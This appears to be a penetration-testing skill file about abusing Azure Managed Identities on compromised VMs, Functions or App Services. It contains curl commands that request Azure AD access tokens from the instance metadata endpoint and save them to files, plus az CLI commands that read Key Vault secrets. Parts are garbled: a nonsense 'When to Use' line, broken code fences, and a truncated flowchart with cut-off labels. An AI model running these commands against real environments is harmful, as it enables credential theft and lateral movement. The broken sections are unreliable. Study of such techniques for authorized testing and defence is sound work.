---
name: azure-managed-identity-abuse
description: >
  Abuse Azure Managed Identities from compromised Azure Virtual Machines (VMs), Functions, or App 
  Services to seamlessly request valid, highly-privileged Azure AD access tokens and laterally move 
  throughout the cloud environment without requiring explicit credentials.
domain: cybersecurity
subdomain: penetration-testing
category: Cloud Security
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006, TA0008]
  techniques: [T1528, T1078.004]
platforms: [azure, cloud]
tags: [cloud-security, azure, managed-identity, imds, penetration-testing, lateral-movement]
tools: [curl, powershell, az-cli, pacu]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Azure Managed Identity Abuse

## When to Use
- When To When Workflow

### Phase 1: Validating the Environment

```bash
# Concept: 1. curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 2. ```

### Phase 2: Requesting Azure AD Tokens

```bash
# Concept: curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true > token.json

# curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true > vault_token.json

# ```

### Phase 3: Abusing the Associated Privileges

```bash
# 1. curl -H "Authorization: Bearer <TOKEN>" https://management.azure.com/subscriptions?api-version=2020-01-01

# 2. CONNECT az CLI az login --identity
az keyvault secret show --name MySecret --vault-name TargetVault
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Compromise ] --> B[Test ]
    B --> C{Does }
    C -->|Yes| D[Request ]
    C -->|No| E[Check D --> F[Pivot ]
```


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture


## Output Format
```
Azure Managed Identity Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Microsoft: [Managed identities for Azure resources](https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview)
- HackTricks: [Azure Managed Identity Abuse](https://book.hacktricks.xyz/cloud-security/azure-security/az-managed-identities)
